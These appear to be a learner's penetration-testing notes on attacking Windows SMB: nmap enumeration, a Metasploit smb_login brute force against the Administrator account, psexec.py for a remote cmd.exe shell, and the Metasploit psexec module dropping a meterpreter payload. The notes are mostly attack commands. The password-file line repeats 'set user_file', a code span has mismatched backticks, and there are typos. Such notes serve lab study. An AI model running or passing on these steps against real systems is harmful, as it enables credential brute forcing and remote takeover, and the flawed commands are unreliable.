# Exploiting SMB

PS Exec requires legitimate credentials  
SMB login brute force attach is the best attack for this  - _We can narrow down to the username **Administrator**_

## Enumerate
Use nmap -sC -sV to verify SMB version  
Message signing enabled but not required - This means we can authenticate with PSexec

## Brute Force
```service postgresql start && msfconsole```

**Module** - auxiliary/scanner/smb/smb_login
user file - ```set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt```  
Password file - ```set user_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt```  
Turn off Verbose

## psexec.py 
Since we cannot run .exe files on linux, we are going to use psexec.py

``psexec.py (username)@(Target IP address) cmd.exe```

## Extending attack - Metasploit
**Module** - exploit/windows/smb/psexec  
_This will authenticate through SMB and upload a meterpreter payload and execute it. This provides us with a meterpreset session_
